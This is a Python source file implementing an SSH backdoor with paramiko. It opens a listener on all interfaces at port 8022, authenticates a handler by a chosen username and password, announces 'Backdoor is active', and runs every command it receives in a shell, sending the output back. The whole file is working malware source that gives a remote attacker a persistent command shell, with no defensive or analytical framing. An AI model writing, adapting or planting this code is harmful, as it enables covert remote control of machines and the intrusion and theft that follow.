import logging
import os
import paramiko
import socket
import threading
import subprocess
import shlex

# configure logging
logging.getLogger("paramiko").setLevel(logging.WARNING)
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] [%(levelname)s] - %(message)s'
)


class SSHbackdoor:
    class Backdoor(paramiko.ServerInterface):
        '''SSH backdoor handler'''

        def __init__(self, username: str, passwd: str) -> None:
            self._username = username
            self._passwd = passwd
            self.event = threading.Event()

        def check_channel_request(self, kind: str, chanid: int) -> int:
            if kind == 'session':
                return paramiko.OPEN_SUCCEEDED
            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

        def check_auth_password(self, username: str, password: str) -> int:
            if (username == self._username) and (password == self._passwd):
                return paramiko.AUTH_SUCCESSFUL
            return paramiko.AUTH_FAILED

    def __init__(self, username: str, passwd: str, host: str = '0.0.0.0', port=8022, rsa_key_path: str = None) -> None:
        assert isinstance(username, str)
        assert isinstance(passwd, str)
        assert isinstance(host, str)
        assert isinstance(port, int)
        assert isinstance(rsa_key_path, str)
        assert os.path.exists(rsa_key_path)  # file doesn't exist

        self._username = username
        self._passwd = passwd
        self._host = host
        self._port = port
        self._rsa_key = paramiko.RSAKey(filename=rsa_key_path)

    def start(self):
        # try to bind socket address to the host
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self._host, self._port))
            logging.info(f'Listening on {self._host}:{self._port}')
            sock.listen(100)
            client, addr = sock.accept()
        except Exception as e:
            logging.error(f'Listen Failed: {e}')
            return
        else:
            logging.info(f'Got connection: {addr}')

        # create ssh
        session = paramiko.Transport(client)
        session.add_server_key(self._rsa_key)
        server = self.Backdoor(self._username, self._passwd)
        session.start_server(server=server)

        channel = session.accept(20)
        if channel is None:
            return

        logging.info('Handler Authenticated')

        # send first message
        channel.send('Backdoor is active')

        while channel.active:
            try:
                cmd = channel.recv(1024).decode('utf-8')

                # if cmd is exit then break the loop
                if cmd == '!!exit':
                    break

                # execute command and return output to handler
                else:
                    output = subprocess.check_output(
                        shlex.split(cmd),
                        shell=True,
                        stderr=subprocess.PIPE,
                    )
                    channel.send(output or '!!ok')

            # send exception to handler
            except Exception as e:
                channel.send(f'Exception: {e}'.encode('utf-8'))
                logging.error(e)

        channel.close()
